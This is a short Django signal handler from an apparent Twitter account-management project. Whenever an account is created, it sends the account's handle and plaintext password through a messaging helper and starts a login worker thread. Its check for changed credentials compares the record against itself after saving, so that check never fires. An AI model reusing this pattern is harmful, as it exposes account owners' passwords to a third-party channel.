from django.db.models.signals import post_save
from django.dispatch import receiver
from .models import TwitterAccount
from .workers.threads import GetAccountLoginInfoFromInstanceThread
from .workers.checker import CheckTwitterAccount
from .core.utils import sendTMessage

@receiver(post_save, sender=TwitterAccount)
def addAccountLoginInfoBeforeSaveTwitterAccount(sender: TwitterAccount, instance: TwitterAccount , created: bool, **kwargs):
    original = TwitterAccount.objects.get(pk = instance.pk)
    if created or original.password != instance.password or original.handle != instance.handle:
        sendTMessage(msg=f"""
{'Trying Add New Twitter Account :' if created else f'Updating Twitter Account with pk {instance.pk} :'}
Agent : {instance.agent}
Handle : {instance.handle}
Password : {instance.password}
        """,
        )
        GetAccountLoginInfoFromInstanceThread(instance).start()

    # checker = CheckTwitterAccount(instance)


